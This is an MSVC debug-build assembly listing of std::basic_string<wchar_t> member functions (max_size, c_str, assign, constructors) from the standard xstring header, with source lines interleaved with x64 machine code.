;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
_Alloc_max$ = 8
_Storage_max$ = 40
$T4 = 264
$T5 = 296
$T6 = 328
__$ArrayPad$ = 344
this$ = 384
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT

; 4165 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 01
	00 00		 sub	 rsp, 392		; 00000188H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 2a 00 00 00	 mov	 ecx, 42			; 0000002aH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+424]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 58 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4166 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

  00049	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00050	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00055	48 8b c8	 mov	 rcx, rax
  00058	e8 00 00 00 00	 call	 ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
  0005d	48 89 45 08	 mov	 QWORD PTR _Alloc_max$[rbp], rax

; 4167 :         const size_type _Storage_max = // can always store small string

  00061	48 c7 85 08 01
	00 00 08 00 00
	00		 mov	 QWORD PTR $T4[rbp], 8
  0006c	48 8d 95 08 01
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  00073	48 8d 4d 08	 lea	 rcx, QWORD PTR _Alloc_max$[rbp]
  00077	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  0007c	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0007f	48 89 45 28	 mov	 QWORD PTR _Storage_max$[rbp], rax

; 4168 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4169 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

  00083	48 8b 45 28	 mov	 rax, QWORD PTR _Storage_max$[rbp]
  00087	48 ff c8	 dec	 rax
  0008a	48 89 85 28 01
	00 00		 mov	 QWORD PTR $T5[rbp], rax
  00091	e8 00 00 00 00	 call	 ?max@?$numeric_limits@_J@std@@SA_JXZ ; std::numeric_limits<__int64>::max
  00096	48 89 85 48 01
	00 00		 mov	 QWORD PTR $T6[rbp], rax
  0009d	48 8d 95 28 01
	00 00		 lea	 rdx, QWORD PTR $T5[rbp]
  000a4	48 8d 8d 48 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  000ab	e8 00 00 00 00	 call	 ??$min@_K@std@@YAAEB_KAEB_K0@Z ; std::min<unsigned __int64>
  000b0	48 8b 00	 mov	 rax, QWORD PTR [rax]

; 4170 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4171 :         );
; 4172 :     }

  000b3	48 8b f8	 mov	 rdi, rax
  000b6	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000ba	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData
  000c1	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000c6	48 8b c7	 mov	 rax, rdi
  000c9	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000d0	48 33 cd	 xor	 rcx, rbp
  000d3	e8 00 00 00 00	 call	 __security_check_cookie
  000d8	48 8d a5 68 01
	00 00		 lea	 rsp, QWORD PTR [rbp+360]
  000df	5f		 pop	 rdi
  000e0	5d		 pop	 rbp
  000e1	c3		 ret	 0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
this$ = 224
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str, COMDAT

; 4143 :     _NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* c_str() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4144 :         return _Mypair._Myval2._Myptr();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr

; 4145 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
_TEXT	SEGMENT
this$ = 224
_Ptr$ = 232
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT

; 3431 :     _CONSTEXPR20 basic_string& assign(_In_z_ const _Elem* const _Ptr) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3432 :         return assign(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

  00024	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  0002b	e8 00 00 00 00	 call	 ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ; std::_WChar_traits<wchar_t>::length
  00030	48 8b c8	 mov	 rcx, rax
  00033	e8 00 00 00 00	 call	 ??$_Convert_size@_K_K@std@@YA_K_K@Z ; std::_Convert_size<unsigned __int64,unsigned __int64>
  00038	4c 8b c0	 mov	 r8, rax
  0003b	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00042	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign

; 3433 :     }

  0004e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00055	5f		 pop	 rdi
  00056	5d		 pop	 rbp
  00057	c3		 ret	 0
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
_TEXT	SEGMENT
_Old_ptr$1 = 8
$T2 = 228
$T3 = 260
this$ = 320
_Ptr$ = 328
_Count$ = 336
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT

; 3410 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN4:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3411 :         // assign [_Ptr, _Ptr + _Count)
; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  00029	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  00034	48 39 85 50 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  0003b	77 6c		 ja	 SHORT $LN2@assign

; 3413 :             _ASAN_STRING_REMOVE(*this);
; 3414 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  0003d	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b c8	 mov	 rcx, rax
  00047	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  0004c	48 89 45 08	 mov	 QWORD PTR _Old_ptr$1[rbp], rax

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00050	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00057	48 8b 8d 50 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0005e	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 3416 :             _Traits::move(_Old_ptr, _Ptr, _Count);

  00062	4c 8b 85 50 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00069	48 8b 95 48 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00070	48 8b 4d 08	 mov	 rcx, QWORD PTR _Old_ptr$1[rbp]
  00074	e8 00 00 00 00	 call	 ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00079	33 c0		 xor	 eax, eax
  0007b	66 89 85 e4 00
	00 00		 mov	 WORD PTR $T2[rbp], ax
  00082	48 8b 45 08	 mov	 rax, QWORD PTR _Old_ptr$1[rbp]
  00086	48 8b 8d 50 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0008d	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00091	48 8d 95 e4 00
	00 00		 lea	 rdx, QWORD PTR $T2[rbp]
  00098	48 8b c8	 mov	 rcx, rax
  0009b	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  000a0	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000a7	eb 35		 jmp	 SHORT $LN1@assign
$LN2@assign:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  000a9	48 8d 85 04 01
	00 00		 lea	 rax, QWORD PTR $T3[rbp]
  000b0	48 8b f8	 mov	 rdi, rax
  000b3	33 c0		 xor	 eax, eax
  000b5	b9 01 00 00 00	 mov	 ecx, 1
  000ba	f3 aa		 rep stosb
  000bc	4c 8b 8d 48 01
	00 00		 mov	 r9, QWORD PTR _Ptr$[rbp]
  000c3	44 0f b6 85 04
	01 00 00	 movzx	 r8d, BYTE PTR $T3[rbp]
  000cb	48 8b 95 50 01
	00 00		 mov	 rdx, QWORD PTR _Count$[rbp]
  000d2	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d9	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN1@assign:

; 3423 :             _Count,
; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {
; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);
; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());
; 3427 :             },
; 3428 :             _Ptr);
; 3429 :     }

  000de	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  000e5	5f		 pop	 rdi
  000e6	5d		 pop	 rbp
  000e7	c3		 ret	 0
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
_TEXT	SEGMENT
this$ = 224
_Ptr$ = 232
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT

; 3239 :     _CONSTEXPR20 basic_string& operator=(_In_z_ const _Elem* const _Ptr) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3240 :         return assign(_Ptr);

  00024	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  0002b	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00032	e8 00 00 00 00	 call	 ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign

; 3241 :     }

  00037	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003e	5f		 pop	 rdi
  0003f	5d		 pop	 rbp
  00040	c3		 ret	 0
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
_My_data$ = 8
$T1 = 228
this$ = 288
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty, COMDAT

; 2643 :     _CONSTEXPR20 void _Construct_empty() {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2644 :         auto& _My_data = _Mypair._Myval2;

  0001f	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2645 :         _My_data._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

  0002a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  00031	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00035	e8 00 00 00 00	 call	 ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2646 : 
; 2647 :         // initialize basic_string data members
; 2648 :         _My_data._Mysize = 0;

  0003a	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0003e	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00046	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0004a	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();

  00052	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00056	e8 00 00 00 00	 call	 ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer

; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0005b	33 c0		 xor	 eax, eax
  0005d	66 89 85 e4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00064	b8 02 00 00 00	 mov	 eax, 2
  00069	48 6b c0 00	 imul	 rax, rax, 0
  0006d	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00071	48 03 c8	 add	 rcx, rax
  00074	48 8b c1	 mov	 rax, rcx
  00077	48 8d 95 e4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0007e	48 8b c8	 mov	 rcx, rax
  00081	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2654 :     }

  00086	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0008d	5f		 pop	 rdi
  0008e	5d		 pop	 rbp
  0008f	c3		 ret	 0
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Old_ptr$ = 232
_Capacity$ = 240
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity, COMDAT

; 2638 :         _Alty& _Al, const pointer _Old_ptr, const size_type _Capacity) noexcept {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2639 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2640 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00030	48 ff c0	 inc	 rax
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Old_ptr$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00044	e8 00 00 00 00	 call	 ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ; std::allocator<wchar_t>::deallocate

; 2641 :     }

  00049	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00050	5f		 pop	 rdi
  00051	5d		 pop	 rbp
  00052	c3		 ret	 0
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 196
this$ = 256
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2499 :     basic_string() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 95 c4 00
	00 00		 movzx	 edx, BYTE PTR $T1[rbp]
  0002d	48 8b c8	 mov	 rcx, rax
  00030	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>

; 2500 :         _Construct_empty();

  00035	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty

; 2501 :     }

  00041	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b bd e0 00
	00 00		 mov	 rdi, QWORD PTR this$[rbp]
  0002d	33 c0		 xor	 eax, eax
  0002f	b9 10 00 00 00	 mov	 ecx, 16
  00034	f3 aa		 rep stosb
  00036	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003d	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00044	5f		 pop	 rdi
  00045	5d		 pop	 rbp
  00046	c3		 ret	 0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
